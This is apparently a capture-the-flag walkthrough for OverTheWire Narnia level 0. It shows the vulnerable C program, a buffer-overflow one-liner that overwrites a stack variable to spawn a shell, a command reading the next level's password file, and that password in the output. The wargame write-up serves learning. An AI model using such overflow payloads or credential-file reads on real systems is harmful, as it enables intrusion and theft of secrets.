# narnia 0

    # ssh narnia0@narnia.labs.overthewire.org
    password: narnia0

    # cat /games/narnia/narnia0.c

    #include <stdio.h>
    #include <stdlib.h>

    int main(){
        long val=0x41414141;
        char buf[20];

        printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
        printf("Here is your chance: ");
        scanf("%24s",&buf);

        printf("buf: %s\n",buf);
        printf("val: 0x%08x\n",val);

        if(val==0xdeadbeef)
            system("/bin/sh");
        else {
            printf("WAY OFF!!!!\n");
            exit(1);
        }

        return 0;
    }

    # ((echo -e "12345123451234512345\xef\xbe\xad\xde");(echo cat /etc/narnia_pass/narnia1)) | /games/narnia/narnia0
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: buf: 12345123451234512345ﾭ�
    val: 0xdeadbeef
    efeidiedae

